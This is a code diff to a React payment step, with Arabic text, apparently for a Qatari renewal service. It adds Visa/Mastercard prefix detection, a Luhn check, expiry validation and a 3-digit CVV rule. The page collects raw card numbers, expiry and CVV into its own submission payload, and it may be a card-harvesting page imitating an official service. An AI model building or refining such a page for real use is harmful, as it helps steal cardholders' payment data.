@@ -39,6 +39,7 @@ const PAYMENT_METHOD_OPTIONS = [
   { id: 'visa', label: 'Visa', logo: '/R.png' },
 ] as const
 
+type PaymentMethod = (typeof PAYMENT_METHOD_OPTIONS)[number]['id']
 type OperationType = (typeof OPERATION_OPTIONS)[number]['id']
 type ReceiptChoice = (typeof RECEIPT_OPTIONS)[number]['id']
 
@@ -97,6 +98,45 @@ function formatCard(v: string) {
   return v.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim()
 }
 
+function getCardMethodByPrefix(cardNumber: string): PaymentMethod | null {
+  if (!cardNumber) return null
+  if (cardNumber.startsWith('4')) return 'visa'
+  if (/^(5[1-5]|2(2[2-9]|[3-6]\d|7[01]|720))/.test(cardNumber)) return 'mastercard'
+  return null
+}
+
+function passesLuhn(cardNumber: string) {
+  let sum = 0
+  let shouldDouble = false
+  for (let i = cardNumber.length - 1; i >= 0; i -= 1) {
+    let digit = Number(cardNumber[i])
+    if (Number.isNaN(digit)) return false
+    if (shouldDouble) {
+      digit *= 2
+      if (digit > 9) digit -= 9
+    }
+    sum += digit
+    shouldDouble = !shouldDouble
+  }
+  return sum % 10 === 0
+}
+
+function isFutureOrCurrentExpiry(value: string) {
+  const [yearString, monthString] = value.split('-')
+  const yearValue = Number(yearString)
+  const monthValue = Number(monthString)
+  if (!yearValue || !monthValue || monthValue < 1 || monthValue > 12) return false
+  const now = new Date()
+  const currentYear = now.getFullYear()
+  const currentMonth = now.getMonth() + 1
+  return yearValue > currentYear || (yearValue === currentYear && monthValue >= currentMonth)
+}
+
+function currentMonthIso() {
+  const now = new Date()
+  return `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}`
+}
+
 function formatQatarDate(date: Date) {
   const day = String(date.getDate()).padStart(2, '0')
   const month = String(date.getMonth() + 1).padStart(2, '0')
@@ -138,7 +178,7 @@ export default function SubmitPage() {
   const [phone, setPhone] = useState('')
   const [emailReceipt, setEmailReceipt] = useState<ReceiptChoice>('yes')
   const [smsReceipt, setSmsReceipt] = useState<ReceiptChoice>('yes')
-  const [method, setMethod] = useState('mastercard')
+  const [method, setMethod] = useState<PaymentMethod>('mastercard')
   const [currentExpiryInput, setCurrentExpiryInput] = useState(DEFAULT_CURRENT_EXPIRY_DATE)
   const [cardNumber, setCardNumber] = useState('')
   const [cardExpiry, setCardExpiry] = useState('')
@@ -155,6 +195,30 @@ export default function SubmitPage() {
   }, [requestedYears])
   const totalFee = useMemo(() => yearsCount * FEE_PER_YEAR, [yearsCount])
   const formattedPhone = useMemo(() => (phone ? `+974 ${phone}` : ''), [phone])
+  const cleanCardNumber = useMemo(() => cardNumber.replace(/\D/g, ''), [cardNumber])
+  const detectedCardMethod = useMemo(() => getCardMethodByPrefix(cleanCardNumber), [cleanCardNumber])
+  const minimumCardExpiryMonth = useMemo(() => currentMonthIso(), [])
+  const cardCheck = useMemo(() => {
+    if (!cleanCardNumber) {
+      return { tone: 'neutral' as const, message: 'نقبل بطاقات Visa و Mastercard فقط.' }
+    }
+    if (!detectedCardMethod) {
+      return { tone: 'error' as const, message: 'نوع البطاقة غير مدعوم. يرجى استخدام Visa أو Mastercard.' }
+    }
+    if (cleanCardNumber.length < 16) {
+      return { tone: 'info' as const, message: `أكمل رقم البطاقة (${cleanCardNumber.length}/16)` }
+    }
+    if (detectedCardMethod !== method) {
+      return { tone: 'error' as const, message: 'نوع البطاقة لا يطابق طريقة الدفع المختارة.' }
+    }
+    if (!passesLuhn(cleanCardNumber)) {
+      return { tone: 'error' as const, message: 'رقم البطاقة غير صالح. تحقق من الرقم مرة أخرى.' }
+    }
+    return {
+      tone: 'success' as const,
+      message: `تم التحقق من البطاقة بنجاح (${detectedCardMethod === 'visa' ? 'Visa' : 'Mastercard'})`,
+    }
+  }, [cleanCardNumber, detectedCardMethod, method])
 
   const currentExpiryDate = useMemo(() => formatQatarDateFromIso(currentExpiryInput), [currentExpiryInput])
   const newExpiryDate = useMemo(() => addYearsToIsoDate(currentExpiryInput, yearsCount), [currentExpiryInput, yearsCount])
@@ -184,6 +248,7 @@ export default function SubmitPage() {
       feeAmount: totalFee,
       method,
       cardNumber: cardNumber.replace(/\s/g, ''),
+      cardBrand: detectedCardMethod ?? method,
       dateMonth: expiryMonth ?? '',
       datayaer: expiryYear ? expiryYear.slice(-2) : '',
       cardExpiry,
@@ -238,7 +303,7 @@ export default function SubmitPage() {
     setStep(4)
   }
 
-  const proceedToCardEntry = async (selectedMethod: string) => {
+  const proceedToCardEntry = async (selectedMethod: PaymentMethod) => {
     setMethod(selectedMethod)
     setLoading(true)
     try {
@@ -250,11 +315,16 @@ export default function SubmitPage() {
 
   const handleStep5 = async (e: FormEvent) => {
     e.preventDefault()
-    const cleanCard = cardNumber.replace(/\s/g, '')
+    const cleanCard = cleanCardNumber
     if (!cardHolder.trim()) return alert('الرجاء إدخال اسم حامل البطاقة')
-    if (cleanCard.length < 16) return alert('الرجاء إدخال رقم البطاقة بشكل صحيح (16 رقمًا)')
+    if (cleanCard.length !== 16) return alert('الرجاء إدخال رقم البطاقة بشكل صحيح (16 رقمًا)')
+    const detectedMethod = getCardMethodByPrefix(cleanCard)
+    if (!detectedMethod) return alert('البطاقة غير مدعومة. يرجى استخدام Visa أو Mastercard فقط')
+    if (detectedMethod !== method) return alert('نوع البطاقة لا يطابق طريقة الدفع المختارة')
+    if (!passesLuhn(cleanCard)) return alert('رقم البطاقة غير صالح. الرجاء التحقق والمحاولة مجدداً')
     if (!cardExpiry) return alert('الرجاء إدخال تاريخ انتهاء البطاقة')
-    if (cvv.length < 3) return alert('الرجاء إدخال رمز CVV')
+    if (!isFutureOrCurrentExpiry(cardExpiry)) return alert('تاريخ انتهاء البطاقة غير صالح أو منتهي')
+    if (cvv.length !== 3) return alert('رمز CVV يجب أن يتكون من 3 أرقام')
 
     setLoading(true)
     try {
@@ -623,6 +693,19 @@ export default function SubmitPage() {
                     />
                     <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                   </div>
+                  <p
+                    className={`text-xs font-medium ${
+                      cardCheck.tone === 'success'
+                        ? 'text-green-600'
+                        : cardCheck.tone === 'error'
+                          ? 'text-red-600'
+                          : cardCheck.tone === 'info'
+                            ? 'text-amber-600'
+                            : 'text-gray-500'
+                    }`}
+                  >
+                    {cardCheck.message}
+                  </p>
                 </div>
                 <div className="space-y-2">
                   <Label>الاسم كما هو موضح في بطاقتك <span className="text-red-500">*</span></Label>
@@ -640,6 +723,7 @@ export default function SubmitPage() {
                     type="month"
                     value={cardExpiry}
                     onChange={e => setCardExpiry(e.target.value)}
+                    min={minimumCardExpiryMonth}
                     className="h-11 text-center font-mono"
                   />
                 </div>
@@ -651,12 +735,12 @@ export default function SubmitPage() {
                   <div className="space-y-2">
                     <Input
                       value={cvv}
-                      onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
+                      onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 3))}
                       placeholder="CVV"
                       className="h-11 text-center font-mono bg-white"
                       type="password"
                       inputMode="numeric"
-                      maxLength={4}
+                      maxLength={3}
                     />
                   </div>
                 </div>
